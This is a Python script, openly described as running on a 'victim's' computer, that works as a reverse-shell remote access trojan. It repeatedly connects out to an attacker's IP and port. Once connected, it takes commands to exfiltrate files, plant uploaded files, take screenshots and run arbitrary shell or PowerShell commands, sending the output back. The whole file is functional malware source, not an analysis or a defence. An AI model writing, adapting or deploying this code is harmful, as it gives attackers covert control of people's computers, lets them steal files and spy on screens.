import socket
import subprocess
import time
import os
import platform
import datetime
from PIL import ImageGrab

__author__ = "Marcio Castillo"
__license__ = "MIT"

'''
    This script is ran on the vitcim's computer. 
'''

IDENTIFIER = "<END_OF_COMMAND_RESULT>"
eof_identifier = "<END_OF_FILE_IDENTIFIER>"
CHUNK_SIZE = 2048

if __name__ == "__main__":

    hacker_IP = "************"
    hacker_port = 9999
    hacker_address = (hacker_IP, hacker_port)
    
    while True:
        try:
            victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            victim_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            print("Trying to connect to:", hacker_address)
            victim_socket.connect(hacker_address)

            while True:    
                data = victim_socket.recv(1024)
                hacker_command = data.decode()
                print("hacker command =>", hacker_command)

                # change directory
                if hacker_command.startswith("cd"):
                    path2move = hacker_command.replace("cd ", "")
                    if os.path.exists(path2move):
                        os.chdir(path2move)
                        success = "Moved to:" + path2move
                        victim_socket.send(success.encode())
                    else:
                        err = "Directory not found:" + path2move
                        print(err)
                        victim_socket.send(err.encode())
                    continue
                
                # send file back to hacker
                elif hacker_command.startswith("get"):
                    file_name = hacker_command.replace("get ", "")
                    if os.path.exists(file_name):
                        filesize = os.path.getsize(file_name)
                        exists = "yes:{}".format(filesize)
                        victim_socket.send(exists.encode())
                        # start sending the file
                        with open(file_name, "rb") as f:
                            while True:
                                # read the bytes from the file
                                bytes_read = f.read(4096)
                                print("bytes ~>", bytes_read)
                                if not bytes_read:
                                    # file transmitting is done
                                    victim_socket.sendall(eof_identifier.encode())
                                    break
                                # we use sendall to assure transimission in 
                                # busy networks
                                victim_socket.sendall(bytes_read)
                        print("File sent")
                    else:
                        print("File not found")
                        exists = "no"
                        victim_socket.send(exists.encode())
                        continue

                # set file inside victim
                elif hacker_command.startswith("set"):
                    file_name = hacker_command.replace("set ", "")
                    # receive file
                    with open(file_name, "wb") as file:
                        print("Downloading file...")
                        while True:
                            chunk = victim_socket.recv(CHUNK_SIZE)
                            if chunk.endswith(eof_identifier.encode()):
                                chunk = chunk[:-len(eof_identifier)]
                                file.write(chunk)
                                break
                            file.write(chunk)
                    print("File saved:", file_name)
                    continue
                
                # take a screenshot
                elif hacker_command.startswith("screenshot"):
                    filepath = "screenshot_{}.png".format(str(datetime.datetime.now().timestamp()))
                    screenshot = ImageGrab.grab()
                    screenshot.save(filepath, 'PNG')
                    continue  
                
                # run and send terminal outputs
                else:
                    if platform.system() == "Windows":
                        output = subprocess.run(["powershell.exe", hacker_command], shell=True, capture_output=True, stdin=subprocess.DEVNULL)
                        if output.stderr.decode("utf-8") == "":
                            command_result = output.stdout
                            command_result = command_result.decode("utf-8") + IDENTIFIER
                            command_result = command_result.encode("utf-8")
                        else:
                            command_result = output.stderr
                        victim_socket.sendall(command_result)    
                    else:
                        output = subprocess.run([hacker_command], shell=True, capture_output=True, stdin=subprocess.DEVNULL)
                        if output.stderr.decode("utf-8") == "":
                            command_result = output.stdout
                            command_result = command_result.decode("utf-8") + IDENTIFIER
                            command_result = command_result.encode("utf-8")
                        else:
                            command_result = output.stderr
                        victim_socket.sendall(command_result)

        except KeyboardInterrupt:
            print("Exiting script")
        except Exception as err:
            print("Error: ", err)
            time.sleep(5)